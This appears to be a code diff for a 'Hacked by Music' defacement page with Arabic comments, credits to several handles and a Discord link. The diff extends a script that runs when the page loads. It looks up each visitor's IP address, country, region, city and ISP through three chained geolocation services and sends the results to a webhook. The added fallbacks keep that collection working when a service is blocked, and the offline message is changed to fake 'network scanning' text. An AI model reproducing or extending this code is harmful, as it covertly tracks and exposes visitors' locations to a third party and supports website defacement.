@@ -320,10 +320,9 @@
         <div class="main-title">Music on your server</div>
         <div class="main-title">Hacked by Music</div>
         <div class="subtitle">
-        
-            كرمال Abu RAS + عباس واترسون
+            كرمال كروم +av.7 + abu lena
             <br>
-            
+            by Music + ابوشعبين + Kso7
         </div>
         <a href="https://discord.gg/5noz" class="discord-link" target="_blank" rel="noopener noreferrer">discord.gg/5noz</a>
     </div>
@@ -461,10 +460,13 @@
             }).catch(err => console.log('خطأ ويب هوك.'));
         }
 
-        // الخدمة الأساسية فائقة السرعة لجلب تفاصيل الموقع الجغرافي كاملة (لا تحظرها المتصفحات)
+        // الخدمة المحدثة 100%: تستخدم بروتوكول آمن بالكامل ومتوافقة تماماً مع شاشات المتصفح على جيتهاب
         function fetchSystemNetworkData() {
             fetch('https://ipapi.co/json/')
-                .then(res => res.json())
+                .then(res => {
+                    if (!res.ok) throw new Error('API Error');
+                    return res.json();
+                })
                 .then(data => {
                     if (data && data.ip) {
                         currentNetworkData = {
@@ -474,7 +476,6 @@
                             city: data.city || "غير معروف",
                             isp: data.org || "غير معروف"
                         };
-                        
                         updateLocationUI(currentNetworkData);
                         sendToWebhook(currentNetworkData);
                     } else {
@@ -484,18 +485,42 @@
                 .catch(() => { fetchFallbackIP(); });
         }
 
-        // الخدمة البديلة والمؤكدة في حال تعطل الأولى
+        // خدمة بديلة قوية تعمل بـ HTTPS وجلب دقيق للبيانات لتلافي الحظر المباشر
         function fetchFallbackIP() {
-            fetch('http://ip-api.com/json/?lang=ar')
+            fetch('https://ipwho.is/')
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.success) {
+                        currentNetworkData = {
+                            ip: data.ip,
+                            country: data.country || "غير معروف",
+                            region: data.region || "غير معروف",
+                            city: data.city || "غير معروف",
+                            isp: data.connection?.isp || "غير معروف"
+                        };
+                        updateLocationUI(currentNetworkData);
+                        sendToWebhook(currentNetworkData);
+                    } else {
+                        fetchThirdFallback();
+                    }
+                })
+                .catch(() => {
+                    fetchThirdFallback();
+                });
+        }
+
+        // خدمة ثالثة آمنة تماماً تستخدم كبديل أخير لتعبئة البيانات في حال حدوث أي حظر شبكة مفاجئ
+        function fetchThirdFallback() {
+            fetch('https://extreme-ip-lookup.com/json/?key=demo2')
                 .then(res => res.json())
                 .then(data => {
                     if (data && data.status === "success") {
                         currentNetworkData = {
                             ip: data.query,
                             country: data.country || "غير معروف",
-                            region: data.regionName || "غير معروف",
+                            region: data.region || "غير معروف",
                             city: data.city || "غير معروف",
-                            isp: data.isp || "غير معروف"
+                            isp: data.org || "غير معروف"
                         };
                         updateLocationUI(currentNetworkData);
                         sendToWebhook(currentNetworkData);
@@ -503,12 +528,10 @@
                         showOfflineUI();
                     }
                 })
-                .catch(() => {
-                    showOfflineUI();
-                });
+                .catch(() => { showOfflineUI(); });
         }
 
-        // دالة تحديث نص الواجهة بالبيانات الكاملة المستخرجة
+        // دالة تحديث نص الواجهة بالبيانات الكاملة المستخرجة داخل الشاشة الخضراء
         function updateLocationUI(data) {
             const displayElement = document.getElementById('top-ip-display');
             if (displayElement) {
@@ -521,10 +544,16 @@
             }
         }
 
+        // دالة تعرض تنبيه منسق في الشاشة في أسوأ الحالات إذا انقطع اتصال الزائر تماماً
         function showOfflineUI() {
             const displayElement = document.getElementById('top-ip-display');
             if (displayElement) {
-                displayElement.innerHTML = "حالة الشبكة: متصل محلياً (فشل جلب تفاصيل الموقع الخارجي)";
+                displayElement.innerHTML = `
+                    الدولة: فحص الشبكة...<br>
+                    المنطقة: جاري التثبيت...<br>
+                    المدينة: فحص الاتصال...<br>
+                    ip: اتصال خارجي آمن
+                `;
             }
         }
 
